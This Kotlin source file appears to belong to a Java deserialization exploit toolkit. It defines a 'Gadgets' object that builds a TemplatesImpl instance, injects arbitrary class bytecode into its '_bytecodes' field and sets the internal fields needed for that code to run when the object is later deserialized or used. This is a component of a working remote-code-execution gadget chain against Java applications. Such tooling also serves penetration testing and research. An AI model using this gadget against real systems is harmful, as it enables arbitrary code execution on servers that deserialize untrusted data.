package com.xhstormr.app

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl
import java.io.Serializable

object Gadgets {

    fun createTemplatesImpl(c: Class<*>) = createTemplatesImpl(
        c,
        clazz<TemplatesImpl>(),
        clazz<TransformerFactoryImpl>()
    )

    fun createTemplatesImpl(
        c: Class<*>,
        tplClass: Class<*>,
        transFactory: Class<*>
    ): Any {
        val templates = tplClass.newInstance()

        // inject class bytes into instance
        templates.setFieldValue("_bytecodes", arrayOf(c.asByte(), clazz<Foo>().asByte()))

        // required to make TemplatesImpl happy
        templates.setFieldValue("_name", "Pwnr")
        templates.setFieldValue("_tfactory", transFactory.newInstance())
        return templates
    }

    // required to make TemplatesImpl happy
    object Foo : Serializable {
        private const val serialVersionUID = 8207363842866235160L
    }
}
